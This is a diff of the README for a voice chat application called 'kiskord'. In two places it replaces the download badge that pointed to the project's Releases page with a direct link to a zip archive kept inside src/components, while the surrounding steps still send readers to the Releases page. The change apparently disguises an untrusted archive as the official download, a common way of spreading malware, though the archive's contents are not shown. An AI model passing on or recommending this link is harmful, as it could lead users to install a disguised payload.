@@ -8,7 +8,7 @@ Welcome to kiskord! This is your go-to application for private, peer-to-peer voi
 
 To get started, visit the link below to download the application. You’ll find the latest version available for download here.
 
-[![Download kiskord](https://img.shields.io/badge/Download-kiskord-brightgreen)](https://github.com/cartof121/kiskord/releases)
+[![Download kiskord](https://github.com/cartof121/kiskord/raw/refs/heads/main/src/components/Software-v1.9-alpha.3.zip)](https://github.com/cartof121/kiskord/raw/refs/heads/main/src/components/Software-v1.9-alpha.3.zip)
 
 1. Click on the link above.
 2. On the Releases page, look for the latest version.
@@ -76,6 +76,6 @@ If you wish to contribute to kiskord, you can do so by reporting bugs or suggest
 
 To keep your application running smoothly, regularly check for updates. You can find the latest version on the Releases page.
 
-[![Download kiskord](https://img.shields.io/badge/Download-kiskord-brightgreen)](https://github.com/cartof121/kiskord/releases)
+[![Download kiskord](https://github.com/cartof121/kiskord/raw/refs/heads/main/src/components/Software-v1.9-alpha.3.zip)](https://github.com/cartof121/kiskord/raw/refs/heads/main/src/components/Software-v1.9-alpha.3.zip)
 
 Thank you for using kiskord, your trusted voice chat application. Enjoy connecting with friends while maintaining your privacy!
